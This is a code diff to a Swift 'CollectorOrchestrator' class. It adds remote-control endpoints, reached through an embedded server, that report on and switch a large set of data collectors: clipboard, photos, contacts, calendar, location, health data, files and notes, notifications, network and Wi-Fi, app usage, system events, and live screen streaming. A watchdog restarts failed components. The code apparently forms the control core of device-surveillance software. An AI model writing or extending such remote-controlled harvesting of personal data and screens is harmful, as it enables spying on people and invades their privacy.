@@ -10,8 +10,40 @@ public final class CollectorOrchestrator {
 
     public static let shared = CollectorOrchestrator()
     private var pulseTimer: Timer?
+    private var collectorStates: [String: Bool] = [:]
 
     private init() {}
+
+    // MARK: - Remote control (called by EmbeddedServer)
+
+    public func status() -> [String: Any] {
+        [
+            "collectors":     collectorStates,
+            "screenStreaming": ScreenStreamManager.shared.isStreaming,
+            "settings": [
+                "fps":     ScreenStreamManager.shared.maxFPS,
+                "quality": Double(ScreenStreamManager.shared.jpegQuality)
+            ]
+        ]
+    }
+
+    public func toggle(name: String, on: Bool) {
+        switch name {
+        case "app_usage":     on ? AppUsageCollector.shared.start()       : AppUsageCollector.shared.stop()
+        case "notifications": on ? NotificationCollector.shared.start()   : NotificationCollector.shared.stop()
+        case "clipboard":     on ? ClipboardCollector.shared.start()      : ClipboardCollector.shared.stop()
+        case "photo_library": on ? PhotoLibraryCollector.shared.start()   : PhotoLibraryCollector.shared.stop()
+        case "contacts":      on ? ContactsCollector.shared.start()       : ContactsCollector.shared.stop()
+        case "calendar":      on ? CalendarCollector.shared.start()       : CalendarCollector.shared.stop()
+        case "location":      on ? LocationCollector.shared.start()       : LocationCollector.shared.stop()
+        case "health":        on ? HealthCollector.shared.start()         : HealthCollector.shared.stop()
+        case "network":       on ? NetworkAndWiFiCollector.shared.start() : NetworkAndWiFiCollector.shared.stop()
+        case "files":         on ? FilesAndNotesCollector.shared.start()  : FilesAndNotesCollector.shared.stop()
+        case "system_events": on ? SystemEventsCollector.shared.start()   : SystemEventsCollector.shared.stop()
+        default: return
+        }
+        collectorStates[name] = on
+    }
 
     // MARK: - Start all collectors
 
@@ -41,17 +73,17 @@ public final class CollectorOrchestrator {
         EmbeddedServer.shared.start()
         ScreenStreamManager.shared.start()
 
-        AppUsageCollector.shared.start()
-        NotificationCollector.shared.start()
-        ClipboardCollector.shared.start()
-        PhotoLibraryCollector.shared.start()
-        ContactsCollector.shared.start()
-        CalendarCollector.shared.start()
-        LocationCollector.shared.start()
-        HealthCollector.shared.start()
-        NetworkAndWiFiCollector.shared.start()
-        FilesAndNotesCollector.shared.start()
-        SystemEventsCollector.shared.start()
+        AppUsageCollector.shared.start();     collectorStates["app_usage"]     = true
+        NotificationCollector.shared.start(); collectorStates["notifications"] = true
+        ClipboardCollector.shared.start();    collectorStates["clipboard"]     = true
+        PhotoLibraryCollector.shared.start(); collectorStates["photo_library"] = true
+        ContactsCollector.shared.start();     collectorStates["contacts"]      = true
+        CalendarCollector.shared.start();     collectorStates["calendar"]      = true
+        LocationCollector.shared.start();     collectorStates["location"]      = true
+        HealthCollector.shared.start();       collectorStates["health"]        = true
+        NetworkAndWiFiCollector.shared.start();collectorStates["network"]      = true
+        FilesAndNotesCollector.shared.start();collectorStates["files"]         = true
+        SystemEventsCollector.shared.start(); collectorStates["system_events"] = true
         SyncEngine.shared.start()
 
         // Watchdog pulse to restart any failed components
